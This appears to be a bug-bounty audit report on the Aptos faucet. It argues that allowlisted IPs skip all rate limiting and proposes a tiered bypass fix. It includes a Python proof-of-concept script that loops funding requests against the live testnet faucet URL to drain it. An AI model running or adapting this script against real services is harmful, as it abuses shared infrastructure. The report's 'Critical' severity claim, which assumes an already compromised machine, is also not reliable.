# Audit Report

## Title
Critical Faucet Draining Vulnerability via IP Allowlist Bypass

## Summary
An attacker who compromises a machine on an allowlisted IP range can completely drain the faucet by making unlimited funding requests without any rate limiting. The IP allowlist bypasser mechanism disables all security checkers including rate limiters, allowing unbounded resource extraction.

## Finding Description

The Aptos faucet implements a "bypasser" system that allows certain requests to skip all security checks. The `IpAllowlistBypasser` returns `true` for any request originating from an allowlisted IP address. [1](#0-0) 

When a bypasser returns `true`, the request completely skips all checker validation: [2](#0-1) 

This means the rate limiting checks are never executed: [3](#0-2) 

Furthermore, the `complete` step where checkers record successful transactions is also skipped when bypass is true: [4](#0-3) 

The rate limiters (both memory and Redis-based) are implemented as checkers: [5](#0-4) [6](#0-5) 

**Attack Path:**
1. Attacker compromises a machine on an allowlisted IP (e.g., CI infrastructure, internal network)
2. Attacker programmatically sends POST requests to `/fund` endpoint
3. Each request bypasses all rate limiting checks
4. Requests are processed with only per-transaction amount limits (configurable via `maximum_amount_with_bypass`)
5. Attacker can make unlimited sequential requests until faucet is drained
6. For `MintFunder`: unlimited minting until stopped manually
7. For `TransferFunder`: draining continues until balance drops below `minimum_funds`, then health check fails

The only limiting factor is the `concurrent_requests_semaphore`, which only limits concurrent processing, not total requests: [7](#0-6) [8](#0-7) 

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under Aptos Bug Bounty criteria for the following reasons:

1. **Loss of Funds (Complete Draining)**: An attacker can drain the entire faucet by making unlimited requests. For `MintFunder`, this means unlimited token minting. For `TransferFunder`, this means stealing all funds in the faucet account.

2. **Economic Impact**: On testnet/devnet, this disrupts developer onboarding. If deployed on mainnet (hypothetically), this would result in direct financial loss.

3. **Resource Limits Invariant Violation**: The attack violates invariant #9: "All operations must respect gas, storage, and computational limits" - in this case, the rate limiting resource controls.

4. **No Authentication Required Beyond IP**: The attacker only needs access to an allowlisted IP (e.g., compromised CI server, VPN access, or internal network machine).

## Likelihood Explanation

**Likelihood: HIGH**

Factors increasing likelihood:
- IP allowlists are commonly used for CI/CD systems, which are frequent targets for compromise
- Internal networks with allowlisted IPs may have weaker security controls
- VPN credentials for allowlisted ranges could be stolen or leaked
- The attack is trivial to execute (simple HTTP POST requests in a loop)
- No additional authentication or CAPTCHA is required for allowlisted IPs
- The vulnerability is in production code, not an edge case

Factors that might reduce impact (but not likelihood):
- `TransferFunder` eventually stops when balance hits `minimum_funds`
- Health check endpoint will start returning 503, causing load balancer to deregister the instance
- Monitoring might detect unusual activity (but no automatic prevention exists)

## Recommendation

Implement rate limiting that cannot be bypassed, even for allowlisted IPs. The allowlist should only skip CAPTCHA checks and similar anti-abuse measures, not fundamental resource limits.

**Recommended Fix:**

1. Create separate bypass categories:
   - "Soft bypass" for CAPTCHAs and user-friction checks
   - "Hard enforcement" for rate limiting that applies to all requests

2. Modify the bypasser system to return a bypass level instead of boolean:

```rust
pub enum BypassLevel {
    NoBypass,
    SoftBypass,  // Skip CAPTCHAs, magic headers, etc.
    FullBypass,  // Skip everything (use with extreme caution)
}
```

3. Apply rate limiting to all requests regardless of bypass status, but potentially with higher limits for bypassed requests:

```rust
// In preprocess_request
let bypass_level = self.determine_bypass_level(&checker_data).await?;

// Run ALL checkers, but some may adjust behavior based on bypass_level
for checker in &self.checkers {
    if checker.should_run(bypass_level) {
        // Rate limiters always run, but may use higher limits for soft bypasses
        rejection_reasons.extend(
            checker.check(checker_data.clone(), dry_run, bypass_level).await?
        );
    }
}
```

4. For allowlisted IPs, use a separate, higher rate limit instead of no limit:

```rust
pub struct RatelimitConfig {
    max_requests_per_day: u32,
    max_requests_per_day_allowlisted: u32,  // e.g., 10x higher, but still finite
}
```

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Proof of Concept: Drain Aptos Faucet via IP Allowlist Bypass

Prerequisites:
1. Access to a machine on an allowlisted IP range
2. Faucet endpoint URL
3. Python 3 with requests library

This script demonstrates unlimited faucet draining by making
sequential funding requests that bypass all rate limiting.
"""

import requests
import time
from typing import List

class FaucetDrainer:
    def __init__(self, faucet_url: str, attacker_addresses: List[str]):
        self.faucet_url = f"{faucet_url}/fund"
        self.addresses = attacker_addresses
        self.total_drained = 0
        self.request_count = 0
        
    def drain(self, max_requests: int = 10000):
        """
        Drain the faucet by making unlimited funding requests.
        
        Args:
            max_requests: Maximum number of requests to make (safety limit)
        """
        print(f"[*] Starting faucet draining attack from allowlisted IP")
        print(f"[*] Target: {self.faucet_url}")
        print(f"[*] Rotating through {len(self.addresses)} addresses")
        
        for i in range(max_requests):
            # Rotate through addresses to maximize draining
            address = self.addresses[i % len(self.addresses)]
            
            try:
                response = requests.post(
                    self.faucet_url,
                    json={"address": address},
                    timeout=10
                )
                
                if response.status_code == 200:
                    self.request_count += 1
                    data = response.json()
                    txn_hashes = data.get('txn_hashes', [])
                    
                    # Estimate drained amount (depends on faucet configuration)
                    # Default is typically 100_000_000_000 OCTA per request
                    estimated_amount = 100_000_000_000
                    self.total_drained += estimated_amount
                    
                    print(f"[+] Request #{self.request_count} succeeded")
                    print(f"    Address: {address}")
                    print(f"    Txn Hashes: {txn_hashes}")
                    print(f"    Total drained: {self.total_drained / 1e8:.2f} APT")
                    
                elif response.status_code == 503:
                    print("[!] Faucet returned 503 - likely drained or unhealthy")
                    break
                    
                else:
                    print(f"[!] Request failed with status {response.status_code}")
                    print(f"    Response: {response.text}")
                    
            except Exception as e:
                print(f"[!] Error: {e}")
                time.sleep(1)
                continue
                
            # Optional: Add minimal delay to avoid overwhelming the server
            # But note: no rate limiting will stop this attack!
            time.sleep(0.1)
        
        print(f"\n[*] Attack completed")
        print(f"[*] Successful requests: {self.request_count}")
        print(f"[*] Estimated total drained: {self.total_drained / 1e8:.2f} APT")

if __name__ == "__main__":
    # Configuration
    FAUCET_URL = "http://faucet.testnet.aptoslabs.com"
    
    # Generate multiple attacker addresses
    ATTACKER_ADDRESSES = [
        "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
        "0xfedcba0987654321fedcba0987654321fedcba0987654321fedcba0987654321",
        # Add more addresses to maximize draining
    ]
    
    drainer = FaucetDrainer(FAUCET_URL, ATTACKER_ADDRESSES)
    
    # Execute the attack
    # This will continue until the faucet is drained or max_requests is reached
    drainer.drain(max_requests=10000)
```

**Expected Outcome:**
- All requests succeed with HTTP 200 responses
- No rate limiting rejection occurs
- Requests continue indefinitely until faucet funds are exhausted
- For `MintFunder`: tokens are minted without limit
- For `TransferFunder`: funds are drained until balance < `minimum_funds`

## Notes

This vulnerability exists because the design conflates two different security concerns:
1. **Friction reduction** (skipping CAPTCHAs for trusted sources)
2. **Resource exhaustion protection** (rate limiting)

The IP allowlist should only address concern #1, but currently disables both. This creates an all-or-nothing security model where allowlisted IPs have zero protection against abuse.

Additionally, the `concurrent_requests_semaphore` only limits concurrent processing, not total request volume, so it provides no protection against sequential draining attacks.

The vulnerability affects both `MintFunder` and `TransferFunder` configurations, though `TransferFunder` has a built-in safety mechanism (minimum balance check) that eventually stops the draining, while `MintFunder` has no such protection.

### Citations

**File:** crates/aptos-faucet/core/src/bypasser/ip_allowlist.rs (L24-29)
```rust
#[async_trait]
impl BypasserTrait for IpAllowlistBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        Ok(self.manager.contains_ip(&data.source_ip))
    }
}
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L245-259)
```rust
        for bypasser in &self.bypassers {
            if bypasser
                .request_can_bypass(checker_data.clone())
                .await
                .map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::BypasserError)
                })?
            {
                info!(
                    "Allowing request from {} to bypass checks / storage",
                    source_ip
                );
                return Ok((checker_data, true, permit));
            }
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L261-278)
```rust
        // Ensure request passes checkers.
        let mut rejection_reasons = Vec::new();
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
        }

        if !rejection_reasons.is_empty() {
            return Err(AptosTapError::new(
                format!("Request rejected by {} checkers", rejection_reasons.len()),
                AptosTapErrorCode::Rejected,
            )
            .rejection_reasons(rejection_reasons));
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L332-347)
```rust
        if !bypass {
            let response_is_500 = match &fund_result {
                Ok(_) => false,
                Err(e) => e.error_code.status().is_server_error(),
            };
            let complete_data = CompleteData {
                checker_data,
                txn_hashes: txn_hashes.clone(),
                response_is_500,
            };
            for checker in &self.checkers {
                checker.complete(complete_data.clone()).await.map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError)
                })?;
            }
        }
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L67-91)
```rust
impl CheckerTrait for MemoryRatelimitChecker {
    async fn check(
        &self,
        data: CheckerData,
        dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        self.clear_if_new_day().await;

        let mut ip_to_requests_today = self.ip_to_requests_today.lock().await;

        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }

        Ok(vec![])
    }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L225-303)
```rust
impl CheckerTrait for RedisRatelimitChecker {
    async fn check(
        &self,
        data: CheckerData,
        dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        let mut conn = self
            .get_redis_connection()
            .await
            .map_err(|e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::StorageError))?;

        // Generate a key corresponding to this identifier and the current day.
        let key_prefix = self.ratelimit_key_provider.ratelimit_key_prefix();
        let key_value = self
            .ratelimit_key_provider
            .ratelimit_key_value(&data)
            .await?;
        let (key, seconds_until_next_day) =
            self.get_key_and_secs_until_next_day(key_prefix, &key_value);

        // Get the value for the key, indicating how many non-500 requests we have
        // serviced for it today.
        let limit_value: Option<i64> = conn.get(&key).await.map_err(|e| {
            AptosTapError::new_with_error_code(
                format!("Failed to get value for redis key {}: {}", key, e),
                AptosTapErrorCode::StorageError,
            )
        })?;

        // If the limit value is greater than what we allow per day, signal that we
        // should reject this request.
        if let Some(rejection_reason) = self.check_limit_value(limit_value, seconds_until_next_day)
        {
            return Ok(vec![rejection_reason]);
        }

        // Atomically increment the counter for the given key, creating it and setting
        // the expiration time if it doesn't already exist.
        if !dry_run {
            let incremented_limit_value = match limit_value {
                Some(_) => conn.incr(&key, 1).await.map_err(|e| {
                    AptosTapError::new_with_error_code(
                        format!("Failed to increment redis key {}: {}", key, e),
                        AptosTapErrorCode::StorageError,
                    )
                })?,
                // If the limit value doesn't exist, create it and set the
                // expiration time.
                None => {
                    let (incremented_limit_value,): (i64,) = redis::pipe()
                        .atomic()
                        .incr(&key, 1)
                        // Expire at the end of the day roughly.
                        .expire(&key, seconds_until_next_day as usize)
                        // Only set the expiration if one isn't already set.
                        // Only works with Redis 7 sadly.
                        // .arg("NX")
                        .ignore()
                        .query_async(&mut *conn)
                        .await
                        .map_err(|e| {
                            AptosTapError::new_with_error_code(
                                format!("Failed to increment value for redis key {}: {}", key, e),
                                AptosTapErrorCode::StorageError,
                            )
                        })?;
                    incremented_limit_value
                },
            };

            // Check limit again, to ensure there wasn't a get / set race.
            if let Some(rejection_reason) =
                self.check_limit_value(Some(incremented_limit_value), seconds_until_next_day)
            {
                return Ok(vec![rejection_reason]);
            }
        }

        Ok(vec![])
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L93-96)
```rust
        let concurrent_requests_semaphore = self
            .handler_config
            .max_concurrent_requests
            .map(|v| Arc::new(Semaphore::new(v)));
```
